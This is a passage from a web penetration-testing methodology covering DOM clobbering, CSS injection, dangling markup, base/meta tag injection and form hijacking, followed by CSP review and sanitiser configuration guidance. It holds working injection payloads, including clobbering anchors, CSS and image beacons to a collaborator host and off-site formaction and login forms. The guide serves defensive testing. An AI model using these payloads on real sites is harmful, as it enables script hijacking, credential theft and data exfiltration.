4. Check what happens **after** sanitising: string concatenation of sanitised output with other strings, a second Markdown or template pass, `innerHTML` of sanitised output into a different context (inside a `textarea`, `noscript` or SVG), or sanitising on the server with one parser and rendering on the client with another. Each can reintroduce markup the sanitiser removed. The XSS consequences of that are covered in [Reflected and stored XSS](/web/web-reflected-stored-xss/).
5. Check whether sanitised user content shares an origin with the application. A separate content origin (a different hostname, or a sandboxed frame) removes clobbering and most CSS risks against the main application.

#### Observation

Illustrative configuration found in a bundle:

```javascript
// Illustrative: rich-text comments
const clean = DOMPurify.sanitize(dirty, {
  ADD_ATTR: ["target"],
  // id and name allowed by default; SANITIZE_NAMED_PROPS not set
  // style element and attribute allowed by default
});
```

#### Evaluation

Findings, each rated by what tests 3 to 9 show it enables:

- `SANITIZE_DOM: false`, or a custom filter with no clobbering protection, on a path that renders other users' content.
- `id`/`name` allowed without namespace isolation on a page that runs scripts with clobberable lookups (test 3). Without a reachable gadget this is a hardening recommendation (Info), not a vulnerability.
- `style` allowed in content other users see, with no CSS allow-list (ASVS `v5.0.0-1.3.5`).
- A sanitiser version with a published bypass: report as a dependency finding (A03:2025), raised to the XSS rating if the vulnerable feature is in use.
- A regex-based or hand-written filter (ASVS `v5.0.0-1.3.1` asks for a well-known sanitisation library).

#### False positives

A permissive configuration on a path that only renders the author's own content, or that renders into a sandboxed frame on another origin. DOMPurify configuration objects are sometimes built in several places; confirm which one the rendering path actually uses by setting a breakpoint on `DOMPurify.sanitize`.

#### Automation

Dependency scanners (`npm audit`, GitHub Dependabot, OWASP Dependency-Check) catch the version part. A unit test that snapshots the effective sanitiser config, and fails when someone adds `id`, `name` or `style` to it, makes the review repeatable.

### GT-WEB-CLOB-3: Find clobberable references in the JavaScript

*Guler Tech methodology.* Implements "Identify clobberable references" of WSTG-CLNT-16; checks ASVS `v5.0.0-3.2.3`.

#### What it checks

Whether scripts on pages that render user HTML read names they do not define (globals, `document` properties, form properties) and pass them to a sensitive use.

#### Prerequisites

The list of pages from test 1 where `id` or `name` survive; the scripts loaded on those pages, saved locally from your own session; source maps if available.

#### Steps

1. Save every script the page loads (DevTools Sources, or the URLs from Burp's site map) into a local directory and search it. These patterns produce most leads:

   ```bash
   # Defaults taken from globals: window.x || ..., window.x ?? ...
   rg -n -e 'window\.[A-Za-z_$][A-Za-z0-9_$]*\s*(\|\||\?\?)' scripts/
   # Existence checks on bare names
   rg -n -e 'typeof [A-Za-z_$][A-Za-z0-9_$]* *[!=]==? *.undefined' scripts/
   # document lookups by name, including bundler runtime patterns
   rg -n -e 'document\.currentScript' -e 'document\.[a-z][A-Za-z0-9_]*(Config|Settings|Options)' scripts/
   # Built-in form properties read by filters
   rg -n -e '\.attributes\b' -e '\.childNodes\b' scripts/ | rg -i 'form|sanitiz|filter'
   ```

2. For each hit, ask three questions: is the name ever defined on this page (look for inline scripts that set it, and check in the console with no user content present)? Can it be undefined on some page that renders user content (error pages, embeds, previews, a route that skips the bootstrap script)? Where does the value go?
3. Follow the value to its sink: `script.src`, `import()` paths, `iframe.src`, `location` and `window.open`, `href` and `action` attributes, `innerHTML`, `insertAdjacentHTML`, `eval`, `setTimeout` with a string, a `fetch` base URL, or a security decision (`if (cfg.isAdmin)`).
4. Check the libraries too. Bundler runtimes (webpack automatic `publicPath`, Vite and Rollup `import.meta.url` handling in non-ES formats) and older library versions have known gadgets; match the versions against the advisories in [Gadgets in libraries and bundlers](#gadgets-in-libraries-and-bundlers).
5. Optionally, enable DOM Invader's DOM clobbering mode in Burp's browser, reload the page, and review the sinks it reports. Treat its output as leads to verify in test 4, not as findings.

#### Observation

Illustrative leads:

| File | Code | Defined on this page? | Sink |
|---|---|---|---|
| `app.3f2a.js` | `const cfg = window.widgetConfig ?? {}` | No (only on `/dashboard`) | `script.src = cfg.cdnBase + "/w.js"` |
| `admin-ui.js` | `if (window.FEATURE_FLAGS && FEATURE_FLAGS.debug)` | No | Shows debug panel (client-side only) |
| `runtime.91c0.js` | `scriptUrl = document.currentScript.src` (webpack 5.90) | n/a | Chunk base URL |

#### Evaluation

A lead becomes a candidate when the name is undefined on a page where `id`/`name` survive and the value reaches a sink. Confirm every candidate in test 4 before reporting; a static lead alone is a code-quality observation (ASVS `v5.0.0-3.2.3`, L3).

#### False positives

- The name is defined by an inline script that runs **before** the user content is parsed, with `var` or a function declaration (the definition wins).
- The lookup only runs on pages that never render user HTML.
- The value is checked strictly before use (`typeof cfg.cdnBase === "string"` and an allow-list), or is only used in a way an element cannot satisfy.
- Minified code: the same short name (`t`, `e`) appears everywhere; only property accesses on `window` and `document` matter.

#### Automation

ESLint core rules help on the application's own code: `no-undef` and `no-implicit-globals` catch undeclared names, and `no-restricted-properties` or `no-restricted-syntax` can forbid `window.<name>` reads outside an allow-list. Add the `rg` patterns above as a CI check on built bundles so a new `window.x ||` default fails the build.

### GT-WEB-CLOB-4: Confirm a clobbered reference reaches a sink

*Guler Tech methodology.* Implements "Clobbering techniques" and the example of WSTG-CLNT-16; checks ASVS `v5.0.0-3.2.3`.

#### What it checks

That markup the sanitiser keeps actually replaces the reference from test 3 and that the controlled value reaches the sink, demonstrated without running attacker script.

#### Prerequisites

A candidate from test 3; an injection point from test 1 on the same page; users A and B.

#### Steps

1. Choose the markup that gives the reference the shape the code needs (one level, a string, two levels). For the illustrative `cfg.cdnBase` lead, two anchors with the same `id`, where the second has `name="cdnBase"` and an `href` on `example.org`:

   ```http
   POST /api/posts/4711/comments HTTP/1.1
   Host: app.example.com
   Cookie: session=<SESSION_USER_A>
   Content-Type: application/json

   {"body_html":"<a id=\"widgetConfig\"></a><a id=\"widgetConfig\" name=\"cdnBase\" href=\"https://example.org/gt-clob-4\">GT-CLOB-4</a>"}
   ```

   ```bash
   curl -s https://app.example.com/api/posts/4711/comments \
     -H 'Cookie: session=<SESSION_USER_A>' -H 'Content-Type: application/json' \
     --data '{"body_html":"<a id=\"widgetConfig\"></a><a id=\"widgetConfig\" name=\"cdnBase\" href=\"https://example.org/gt-clob-4\">GT-CLOB-4</a>"}'
   ```

   Post 4711 is a post in a private space only your test accounts can see.
2. Load the page as user B with DevTools open and the Network panel recording.
3. In the Console, show the chain:

   ```javascript
   window.widgetConfig;           // HTMLCollection(2)
   widgetConfig.cdnBase;          // the second anchor
   String(widgetConfig.cdnBase);  // "https://example.org/gt-clob-4"
   ```

4. In the Network panel, look for the attempted request to `https://example.org/gt-clob-4/w.js`. `example.org` returns an error page, not script, so nothing runs. Screenshot the console and the request.
5. For a logic gadget (`if (window.isAdmin)`), show the UI change, then check that the server refuses the actions behind it; a client-side-only control is rated by what the server allows (see [Authorization bypass techniques](/web/web-authorization-bypass-techniques/)). For a navigation gadget, the target is `https://example.org/` only.
6. Only if the client asks for execution to be proven, and only in staging or a lab: point the `href` at a file on your own host containing `console.log("GT-CLOB-4")` and nothing else, and record the console line.
7. Remove the comment and confirm removal as user B.

#### Observation

Illustrative console output as user B:

```text
> String(widgetConfig.cdnBase)
< 'https://example.org/gt-clob-4'
Network: GET https://example.org/gt-clob-4/w.js  initiator app.3f2a.js  (failed, no script ran)
```

If a CSP blocks the load you see a violation instead, such as `Refused to load the script 'https://example.org/gt-clob-4/w.js' because it violates the following Content Security Policy directive`. Note which directive did it, because that is what stands between this gadget and XSS.

#### Evaluation

- **Vulnerable (XSS):** a clobbered value becomes a script URL, executable HTML or a `javascript:` navigation and nothing blocks it, or the CSP trusts it (`'strict-dynamic'` trusts scripts created by trusted scripts). Rate as stored XSS against the viewers of that content (CWE-79).
- **Vulnerable (redirect):** the value becomes a navigation target (CWE-601).
- **Vulnerable (client-side check):** the value flips a check, and the server also trusts the outcome. If the server enforces correctly, it is a low finding about client code.
- **Mitigated:** the load is refused by CSP; report the gadget anyway, because the CSP is the only control and a later policy change reopens it.
- **Not vulnerable:** the named property is not created (prefixed or stripped), or the code validates type before use.

#### False positives

The request in the Network panel came from your own manual click rather than the page's code (check the Initiator column). The page was loaded from cache with an older bundle. A value works in the console only because you created the element yourself in DevTools.

#### Automation

A Playwright or Puppeteer test that renders a corpus of clobbering markups (one level, two levels, `document` names, the bundler runtime names) through the real rendering path and asserts that the relevant globals are still `undefined` or of the expected type. See [Regression tests](#regression-tests).

### GT-WEB-CLOB-5: Find CSS injection in style attributes, style elements and theme values

*Guler Tech methodology.* Implements WSTG-CLNT-05 (identify CSS injection points and assess the impact); checks ASVS `v5.0.0-1.3.5` and `v5.0.0-1.2.1`.

#### What it checks

Whether user input can add CSS rules or declarations that render for other users, through allowed `style` markup, values placed inside stylesheets, or client code that writes style strings.

#### Prerequisites

The matrix from test 1; the list of theme, branding and customisation settings; users A and B.

#### Steps

1. **Allowed style markup.** If test 1 shows `style` attributes or elements surviving, check whether positioning survives too (the UI-redress case). Store a visible marker:

   ```html
   <div style="position:fixed;top:0;left:0;width:100%;padding:8px;background:#ffef9f;z-index:2147483647">GT-CLOB-5 overlay (test marker)</div>
   ```

   As user B, check that the banner covers the top of the application's own page, not just the comment box. Remove it straight away.
2. **Values inside CSS.** For each theme or branding value (colour, font, image URL, custom property), save a value that closes the declaration and adds a harmless rule with a visible marker:

   ```text
   #336699; } body::after { content: "GT-CLOB-5"; color: magenta; } .gt-x {
   ```

   Then view a page that uses the theme. A `GT-CLOB-5` at the end of the body means the value is parsed as CSS rules, not as a colour.
3. **Breaking out of the style element.** In the same field, check whether a closing `style` tag is escaped. If `</style>` followed by markup renders as HTML, the field is an HTML injection point and you continue in [Reflected and stored XSS](/web/web-reflected-stored-xss/).
4. **Client-side style sinks.** In the bundles, search for `style.cssText`, `setAttribute("style"`, `insertRule(`, `CSSStyleSheet` and template strings that build CSS, and trace their inputs (URL fragments, query parameters, stored settings). WSTG-CLNT-05's example is a `location.hash` value written into `cssText`.
5. **Who renders it.** For every confirmed point, list who sees the CSS: the author only, members of the same workspace, all users, staff in a back-office tool, email recipients. Then list what sensitive data is **rendered as attributes** on those pages (hidden CSRF inputs, pre-filled forms, `data-*` attributes with personal data, links with tokens), by reading the DOM of your own test account's pages. This is the data at risk, recorded without extracting anything.

#### Observation

Illustrative rendered theme block as user B:

```html
<style>
  :root { --brand: #336699; } body::after { content: "GT-CLOB-5"; color: magenta; } .gt-x {; }
</style>
```

The marker appears at the bottom of every page in the workspace.

#### Evaluation

- **Vulnerable:** you can add rules or positioned elements that render for other users. Severity depends on test 6 (whether CSS can make requests to an attacker host) and on the data at risk from step 5: overlay or spoofing only is usually Low to Medium; a working network channel on pages with secrets rendered in attributes is Medium to High.
- **Not vulnerable:** the value is validated against a strict format (rejected or normalised to a colour), `style` is stripped, or only allow-listed properties with validated values survive.
- **Self-only:** the CSS only renders for the author; usually not a finding unless combined with another issue (login CSRF, shared links).

#### False positives

"Custom CSS" features that the client sells as a feature, rendered only on the customer's own branded pages, are by design; the finding is where that CSS reaches other tenants, the application's own UI, or admin views. A marker visible only in the editor's live preview is not stored.

#### Automation

Unit tests that run each theme field's validation against values containing `;`, `}`, `{`, `<` and `url(` and expect rejection. A Playwright check that renders a theme with the marker value and asserts that no element has `::after` content `GT-CLOB-5`.

### GT-WEB-CLOB-6: Prove that injected CSS can make an outbound request

*Guler Tech methodology.* Implements the impact assessment of WSTG-CLNT-05 within our scriptless safety rules; checks the CSP side of ASVS `v5.0.0-3.4.3`.

#### What it checks

Whether CSS injected at a point found in test 5 can make the victim's browser contact a host the attacker controls. That channel is what turns CSS injection from UI redress into data exposure.

#### Prerequisites

A confirmed CSS injection point from test 5; a collaborator subdomain for this test; users A and B.

#### Steps

1. Store a single, unconditional rule that fetches one static URL on your collaborator. No selector depends on page content and the URL contains nothing but a marker:

   ```html
   <div style="background-image:url(https://clob6-a1.oob.example.org/gt-clob-6.png)">GT-CLOB-6</div>
   ```

   or, for a theme value:

   ```text
   #336699; background-image: url(https://clob6-a1.oob.example.org/gt-clob-6.png)
   ```

2. Load the page once as user B with the Network panel open.
3. Check the collaborator for one HTTP request (and the DNS lookup before it) to `clob6-a1.oob.example.org/gt-clob-6.png`. Record the time, the source IP of your own test machine and the `Referer` header (depending on the page's Referrer-Policy it shows the origin or the page; that is browser behaviour, not data you added).
4. If no request arrives, look in the Console for a CSP violation (`img-src`, `style-src` or `default-src`) and record which directive blocked it.
5. Remove the marker.
6. Write the impact in prose from the data-at-risk list in test 5 and the public research (attribute selectors, `:has()`, `@import` chaining, fonts). Do not test those techniques against the client.

#### Observation

Illustrative collaborator entry:

```text
DNS   clob6-a1.oob.example.org   A   from 198.51.100.24
HTTP  GET /gt-clob-6.png  Host: clob6-a1.oob.example.org
      Referer: https://app.example.com/
      User-Agent: Mozilla/5.0 (...)
```

Or, when the channel is closed:

```text
Refused to load the image 'https://clob6-a1.oob.example.org/gt-clob-6.png' because it violates
the following Content Security Policy directive: "img-src 'self' https://cdn.example.com".
```

#### Evaluation

- **Channel open:** a request arrives. Combined with test 5's data at risk, report CSS injection with a working exfiltration channel. The severity follows the most sensitive attribute value rendered on pages where the CSS applies (a CSRF token on a settings page, an API key in a `value` attribute, personal data in pre-filled forms).
- **Channel closed:** CSP blocks the request. The CSS injection remains a UI-redress finding; note that `font-src` and `style-src` (for `@import`) must be closed as well, which you check in test 10 by reading the policy, not by sending more requests.

#### False positives

A request from a link-preview or mail-scanning service, not a browser (check the User-Agent and source IP). A request your own browser extension made. A request that only happens in the editor preview.

#### Automation

None needed on the client system; the check is one request. In CI, assert the CSP header's `img-src`, `font-src` and `style-src` values (test 10).

### GT-WEB-CLOB-7: Dangling markup injection

*Guler Tech methodology.* Implements the scriptless part of WSTG-CLNT-03 (HTML Injection) and the PortSwigger dangling-markup technique, within our safety rules; checks ASVS `v5.0.0-1.2.1`.

#### What it checks

Whether an injection point lets you open an attribute or element that the parser then extends over the following page content, and whether the page could send that content off-site.

#### Prerequisites

An injection point where your input lands inside an attribute or raw HTML **without** being parsed and re-serialised by a sanitiser: typically a reflected parameter, an error message, a server template, or an email template. Users A and B, or your own browser for reflected cases.

#### Steps

1. Confirm the context. Send a harmless marker containing `"`, `'` and `>` and read the response source: which characters come back unencoded, and which quote character encloses the value?

   ```http
   GET /search?q=GT-CLOB-7%22%27%3E HTTP/1.1
   Host: app.example.com
   Cookie: session=<SESSION_USER_A>
   ```

2. **Local capture proof, no request.** Close the current tag and open an attribute that makes no request, using the quote character that appears **next** in the page after your injection point (the one that would end the capture):

   ```http
   GET /search?q=%22%3E%3Cspan%20title%3D%27GT-CLOB-7%20 HTTP/1.1
   Host: app.example.com
   Cookie: session=<SESSION_USER_A>
   ```

   That decodes to `"><span title='GT-CLOB-7 `, an unclosed single-quoted `title`.
3. Open the response in your own browser and inspect the `span` in the Elements panel. If its `title` attribute contains the page markup that followed your injection point (form fields, hidden inputs, text), the parser is consuming the page. Record **which** content was captured by type (for example "the CSRF hidden input and the email field"), with values redacted in the screenshot.
4. **Network proof, one request, no page data.** Separately, check that a complete, closed tag at the same injection point can reach your collaborator:

   ```text
   "><img src="https://clob7-a1.oob.example.org/gt-clob-7.png">
   ```

   One request with the static path proves an outbound channel from this point. Do **not** combine the two steps into an unclosed URL attribute; that would send page content to your collaborator.
5. Check the other channels by reading, not sending: does the CSP restrict `img-src`, `form-action` and navigation-capable elements? Does the page contain your own `base target` before the injection point? Which browsers in scope lack Chromium's dangling-markup mitigations?
6. For stored contexts (an email template, a stored profile field rendered by a template), do the same in an object only your accounts see, then delete it.

#### Observation

Illustrative console check after step 2 (values redacted for the report):

```text
> document.querySelector("span[title^='GT-CLOB-7']").title
< 'GT-CLOB-7 ">\n  </div><form action="/account/email" method="post">\n  <input type="hidden" name="csrf" value="[redacted]">\n  <input name="email" value="[redacted]"> ...'
```

#### Evaluation

- **Vulnerable:** the local proof shows sensitive content captured into your attribute, **and** an outbound channel exists from the injection point (step 4, or a navigation or form channel the CSP does not restrict). Rate on what the captured content is (a CSRF token enables the related forged request; personal data is a confidentiality finding). State which browsers the attack works in.
- **Lower:** capture works but every channel is closed (strict `img-src`, `form-action`, your own `base target`, and the only supported browsers mitigate the rest). Report it as an HTML injection finding with the dangling-markup risk noted, since the underlying encoding bug remains.
- **Not vulnerable:** quotes and `>` are encoded in that context.

#### False positives

The captured text is only what you typed (the next quote is inside your own input). The capture stops before any sensitive content. The response is only ever rendered in your own session with no way to deliver it to another user (no reflected URL, self-only stored value).

#### Automation

Burp Scanner flags some unencoded reflections in attributes; confirm each manually as above. In CI, template unit tests that render each reflected value with `"`, `'` and `>` and assert encoding in that context.

### GT-WEB-CLOB-8: Base tag and meta refresh injection

*Guler Tech methodology.* Implements the scriptless part of WSTG-CLNT-03 for `base` and `meta` elements; related to WSTG-CLNT-04 (client-side URL redirect) for meta refresh; checks ASVS `v5.0.0-3.4.3` (`base-uri`).

#### What it checks

Whether injected `base` or `meta` refresh elements survive and take effect, and whether CSP `base-uri` stops the base case.

#### Prerequisites

Test 1 results; an injection point that renders unsanitised or lightly filtered HTML, ideally one that lands early in the document (titles, banners, server-rendered headers); users A and B.

#### Steps

1. **Base.** In an object only your accounts see, store:

   ```html
   <base href="https://example.org/gt-clob-8/">GT-CLOB-8
   ```

2. Load the page as user B and check in the Console:

   ```javascript
   document.baseURI;                                // "https://example.org/gt-clob-8/" if honoured
   document.querySelectorAll("base").length;        // more than one base?
   new URL("/static/app.js", document.baseURI).href;
   ```

   In the Network panel, look for relative resources after the injection point requested from `example.org`. Record the first few paths, then delete the object. If the CSP blocks it you see a `base-uri` violation in the Console instead.
3. Check `target` as well: `<base target="gt-clob-8">` followed by clicking one of your own links shows whether injected base targets apply (the dangling-markup route through `window.name`).
4. **Meta refresh.** In a separate object:

   ```html
   <meta http-equiv="refresh" content="5;url=https://example.org/">GT-CLOB-8 meta
   ```

   As user B, wait five seconds. Navigation to `https://example.org/` means the element is honoured. Delete it immediately.

#### Observation

Illustrative:

```text
> document.baseURI
< 'https://example.org/gt-clob-8/'
Network: GET https://example.org/static/js/chunk-42.js   (lazy-loaded after the comment rendered)
```

#### Evaluation

- **Vulnerable (base):** `document.baseURI` changes and relative scripts or styles load from the injected host, with no `base-uri` violation. If scripts carry a nonce or `'strict-dynamic'` applies, rate as XSS; if only links and forms move, rate as redirect or form hijacking.
- **Vulnerable (meta):** the page navigates to `example.org`. Rate as an open redirect (CWE-601), higher where the content is shown on trusted, high-traffic pages.
- **Partially mitigated:** the base element survives but `base-uri` blocks it. Report the sanitiser gap as low and confirm the CSP header is on every page, including error pages.
- **Not vulnerable:** both elements are stripped.

#### False positives

The application legitimately sets its own `base` (single-page apps commonly do); only an additional, attacker-controlled one counts. Browsers only honour the **first** `base href`, so an injected one placed after the application's own base has no effect on URLs, though an injected `target` can still apply if the application's base sets none.

#### Automation

A CSP header assertion for `base-uri` (test 10). A sanitiser unit test that `base` and `meta` never survive.

### GT-WEB-CLOB-9: Form, button and formaction hijacking

*Guler Tech methodology.* Implements the scriptless part of WSTG-CLNT-03 for form elements, following Gareth Heyes's form-hijacking research; checks the `form-action` side of ASVS `v5.0.0-3.4.3`.

#### What it checks

Whether injected `form`, `input` and `button` markup can send a real form's fields, or browser-autofilled credentials, to another host.

#### Prerequisites

Test 1 shows `form`, `input`, `button`, `formaction` or the `form` attribute surviving; a page where user content and a real form (settings, payment, reply) appear together; users A and B; the test browser profile with one throwaway saved credential for user B only.

#### Steps

1. Find the target form's `id` in the page (for example `account-form`).
2. **Button pointing at the real form.** In an object only your accounts see, store:

   ```html
   <button form="account-form" formaction="https://example.org/gt-clob-9">GT-CLOB-9 button</button>
   ```

   As user B, do **not** click. Check in the Console:

   ```javascript
   const b = [...document.querySelectorAll("button")].find(x => x.textContent.includes("GT-CLOB-9"));
   b.form && b.form.id;   // "account-form" if the association works
   b.formAction;          // "https://example.org/gt-clob-9"
   ```

3. **Injected login form and autofill.** Store a form with `username` and `password` inputs and an `example.org` action:

   ```html
   <form action="https://example.org/gt-clob-9"><input name="username" autocomplete="username"><input type="password" name="password" autocomplete="current-password"></form>
   ```

   Load the page as user B in the test profile and observe whether the browser fills or offers the throwaway credential. Do not submit. Record a screenshot with the password field masked.
4. If submission must be shown, do it once on your own account with every field holding a dummy value (`GT-CLOB-9`) and no autofill, and check whether the browser navigates to `example.org` or the Console shows a `form-action` violation.
5. Delete the objects.

#### Observation

Illustrative:

```text
> b.form && b.form.id
< 'account-form'
> b.formAction
< 'https://example.org/gt-clob-9'
```

#### Evaluation

- **Vulnerable:** an injected control associates with a real form and its target points off-site with no `form-action` restriction, or the password manager fills an injected form. Rate by what the form carries (credentials and payment data are High).
- **Mitigated:** `form-action 'self'` blocks the submission (step 4 shows a violation); the sanitiser gap remains a low finding, and an attacker could still post to any same-origin endpoint the policy allows.
- **Not vulnerable:** form elements and the `form`/`formaction` attributes are stripped.

#### False positives

Browsers differ in when they autofill (some only after a user gesture, some only on top-level, same-origin forms); record the browser and version. A button that is associated with the form but has its `formaction` stripped only submits to the original target.

#### Automation

Sanitiser unit tests for `form`, `formaction`, `form` attribute and `input type="password"`; a CSP assertion for `form-action`.

### GT-WEB-CLOB-10: Review CSP for scriptless attacks

*Guler Tech methodology.* Supports WSTG-CLNT-05, WSTG-CLNT-16 and WSTG-CLNT-03 with a policy review; checks ASVS `v5.0.0-3.4.3` (L2).

#### What it checks

Whether the Content Security Policy closes the channels scriptless attacks need: style sources, image and font requests, `base-uri`, `form-action`, and the script-loading end of clobbering gadgets. The CSP design itself is in [Content Security Policy and browser security headers](/web/web-content-security-policy-headers/); this test only reads the policy for the directives that matter here.

#### Prerequisites

The response headers of the pages that render user content, including error pages.

#### Steps

1. Fetch the headers:

   ```bash
   curl -s -D - -o /dev/null https://app.example.com/posts/4711 \
     -H 'Cookie: session=<SESSION_USER_B>' | grep -i '^content-security-policy'
   ```

2. Note whether the policy is enforced (`Content-Security-Policy`) or only reported (`Content-Security-Policy-Report-Only`), and whether a `meta` CSP is also present.
3. Read each directive against this table:

   | Directive | What you want for scriptless risks | Red flags |
   |---|---|---|
   | `script-src` | Nonces or hashes; be aware what `'strict-dynamic'` trusts | Host allow-lists including user-content hosts; `'strict-dynamic'` with clobberable script loaders |
   | `style-src` | Nonces or hashes for style elements; no `'unsafe-inline'` if user content may contain styles | `'unsafe-inline'` on pages rendering user HTML; `*` or `https:` (open `@import`) |
   | `img-src`, `font-src` | Specific hosts | `*`, `https:`, broad CDN wildcards that anyone can upload to |
   | `base-uri` | `'none'` (ASVS minimum) or `'self'` | Absent: it does **not** fall back to `default-src` |
   | `form-action` | `'self'` or specific endpoints | Absent: it does **not** fall back to `default-src` |
   | `object-src` | `'none'` (ASVS minimum) | Absent with a permissive `default-src` |

4. Check coverage: is the same policy on every page that renders user content, including server error pages, embedded views and email-preview routes?

#### Observation

Illustrative header:

```http
Content-Security-Policy: default-src 'self'; script-src 'nonce-r4nd0m' 'strict-dynamic'; style-src 'self' 'unsafe-inline'; img-src *; object-src 'none'
```

#### Evaluation

For this header: `style-src 'unsafe-inline'` lets user-supplied style attributes and elements apply; `img-src *` leaves the CSS and dangling-markup image channel open; `base-uri` and `form-action` are missing, so base and form hijacking are not restricted; `'strict-dynamic'` means a clobbering gadget that creates a script element is trusted. Report missing `base-uri` against ASVS `v5.0.0-3.4.3` directly (it names `base-uri 'none'` as a minimum). Report the others as hardening that raises or lowers the severity of the injection findings from tests 4 to 9, rather than as stand-alone high findings.

#### False positives

A policy that looks weak but covers only pages that never render user content. A `Report-Only` header next to a stricter enforced one. A `meta` CSP cannot contain `frame-ancestors` or reporting directives, but it does enforce the others.

#### Automation

A CI test that fetches representative pages and asserts the presence and values of `base-uri`, `form-action`, `object-src`, `style-src` and `img-src`. Google's CSP Evaluator is useful for reviewing script-related weaknesses in the same pass.

## Secure implementation

### Design rules

1. **Keep user content away from the application's namespace.** The strongest fix is structural: render user HTML on a separate origin or in a sandboxed frame, so its elements cannot reach the application's globals, styles or forms (ASVS `v5.0.0-3.5.4` on separate hostnames is the same idea at application level).
2. **Allow-list, do not block-list.** Decide which tags and attributes a feature needs (most comment boxes need a dozen tags and `href`) and allow only those. `id`, `name`, `style`, `form`, `input`, `button`, `base`, `meta` and `link` are rarely needed in user content.
3. **Sanitise once, at the right place, and do not touch the output.** Sanitise immediately before insertion into the DOM, or on the server and render the stored result as-is. Do not concatenate, re-parse or Markdown-process sanitised output.
4. **Write JavaScript that does not trust names it did not define** (ASVS `v5.0.0-3.2.3`): explicit declarations, local scope, strict type checks, no configuration on `window` or `document`.
5. **Treat CSS as code.** User CSS is sanitised or disabled (ASVS `v5.0.0-1.3.5`); user values inside CSS are validated against a strict format.
6. **Close the channels with CSP**: nonces for scripts and styles, specific hosts for images and fonts, `base-uri 'none'`, `form-action 'self'`, `object-src 'none'`.
7. **Test it**, because sanitiser configuration and bundler versions drift ([Regression tests](#regression-tests)).

### Clobber-resistant JavaScript

The vulnerable pattern, and the fix that reads configuration from a server-rendered JSON block, checks every type, and freezes the result:

```javascript
// Vulnerable: any element with id="widgetConfig" becomes the config
const cfg = window.widgetConfig || {};
loadScript(cfg.cdnBase + "/w.js");
```

```javascript
"use strict";

const DEFAULTS = Object.freeze({ cdnBase: "/static" });
const ALLOWED_CDN = new Set(["/static", "https://cdn.example.com/assets"]);

function readConfig() {
  // The server renders <script type="application/json" id="app-config"> in the head,
  // before any user content. Check that the element really is that script.
  const el = document.getElementById("app-config");
  if (!(el instanceof HTMLScriptElement) || el.type !== "application/json") {
    return DEFAULTS;
  }
  let data;
  try {
    data = JSON.parse(el.textContent);
  } catch {
    return DEFAULTS;
  }
  if (data === null || typeof data !== "object") return DEFAULTS;
  const cdnBase =
    Object.hasOwn(data, "cdnBase") &&
    typeof data.cdnBase === "string" &&
    ALLOWED_CDN.has(data.cdnBase)
      ? data.cdnBase
      : DEFAULTS.cdnBase;
  return Object.freeze({ cdnBase });
}

const config = readConfig(); // module-scoped const: not a window property
```

Why each piece matters:

- **`instanceof` and `typeof` checks.** A clobbered value is an `Element` or an `HTMLCollection`, never a string, a plain object from `JSON.parse`, or a specific element type with a specific `type`. Checking the type you expect defeats it; checking only for existence (`if (x)`) does not.
- **`Object.hasOwn`** on parsed data avoids picking up inherited properties (and prototype pollution, see [Server-side prototype pollution](/web/web-server-side-prototype-pollution/) for the server-side version). On `window`, named-access properties live on the window's named properties object in the prototype chain rather than on `window` itself, so `Object.hasOwn(window, "widgetConfig")` is `false` for an element and `true` for a real `var` global or assignment. Treat that as an extra check, not the only one: it does not hold for `document`, whose named properties override its own.
- **Module or block scope.** `const` and `let` in modules do not create `window` properties, so bare-name reads get the declared value. Avoid reading them through `window.` anywhere.
- **No globals on `document`.** Never use `document.someSetting` as storage; `document` named properties override even built-in members.
- **Built-in properties on elements that contain user markup.** When code must read `action`, `attributes` or similar on a form that may contain user controls, read through the prototype getter rather than the instance:

  ```javascript
  const getAction = Object.getOwnPropertyDescriptor(HTMLFormElement.prototype, "action").get;
  const realAction = getAction.call(form); // ignores an injected <input name="action">
  ```

- **Bundlers.** Upgrade webpack to 5.94.0 or later and use a patched Vite or Rollup release (the advisories list the fixed versions per major line). With webpack, setting `output.publicPath` explicitly instead of `auto` also removes the `document.currentScript` lookup.
- **Feature detection.** Check for APIs with `typeof X === "function"` and the expected prototype, not `if (window.X)`.

### DOMPurify configuration

DOMPurify is the usual client-side choice. Its defaults stop script; for this note's attacks you add:

```javascript
import DOMPurify from "dompurify";

const COMMENT_CONFIG = {
  // Default true: removes id/name values that clash with built-in document and form properties.
  // Never set it to false.
  SANITIZE_DOM: true,
  // Prefix every id and name with "user-content-" so they cannot match application names.
  SANITIZE_NAMED_PROPS: true,
  // Scriptless attack surface that comments do not need
  FORBID_TAGS: ["style", "form", "input", "button", "textarea", "select", "option"],
  FORBID_ATTR: ["style", "formaction", "form"],
};

export function renderComment(container, dirty) {
  container.replaceChildren(
    DOMPurify.sanitize(dirty, { ...COMMENT_CONFIG, RETURN_DOM_FRAGMENT: true })
  );
}
```

Notes:

- If the feature does not need `id` and `name` at all, forbid them (`FORBID_ATTR: ["id", "name", ...]`) rather than prefixing.
- `SANITIZE_NAMED_PROPS` changes in-page anchor links: a heading with `id="intro"` becomes `id="user-content-intro"`, so links to `#intro` must be rewritten to match.
- An explicit allow-list (`ALLOWED_TAGS`, `ALLOWED_ATTR`) is stricter than forbidding; per the README, do not combine it with `USE_PROFILES`, which overrides both.
- Keep DOMPurify current. Its README tracks the release line (3.x at the time of writing), and known bypasses are fixed in point releases.
- `IN_PLACE` sanitising requires that the root node itself is not clobbered; prefer sanitising a string.

### Server-side sanitisers: Node.js, Django, Spring and Laravel

When user HTML is sanitised on the server, the same allow-list rules apply. Each example below allows basic formatting and links and nothing that clobbers, restyles or submits.

**Node.js (sanitize-html).** Note that its default `allowedAttributes` gives `a` elements `name` and `target`, so set the list explicitly:

```javascript
const sanitizeHtml = require("sanitize-html");

const COMMENT_OPTIONS = {
  allowedTags: ["p", "br", "b", "i", "em", "strong", "ul", "ol", "li", "blockquote", "code", "pre", "a"],
  allowedAttributes: { a: ["href"] }, // no id, name, style, target
  allowedSchemes: ["https", "mailto"],
};

app.post("/api/posts/:id/comments", requireAuth, async (req, res) => {
  const bodyHtml = sanitizeHtml(String(req.body.body_html || ""), COMMENT_OPTIONS);
  await Comments.create({ postId: req.params.id, authorId: req.user.id, bodyHtml });
  res.status(201).end();
});
```

If colours must be kept, allow `style` and constrain it with `allowedStyles`, which only keeps properties whose values match your regular expressions:

```javascript
const RICH_OPTIONS = {
  ...COMMENT_OPTIONS,
  allowedAttributes: { a: ["href"], span: ["style"] },
  allowedStyles: { span: { color: [/^#[0-9a-f]{6}$/i] } },
};
```

**Django (nh3).** bleach, the older choice, is archived and deprecated by its maintainers; nh3 is the common replacement:

```python
import nh3
from django.db import models

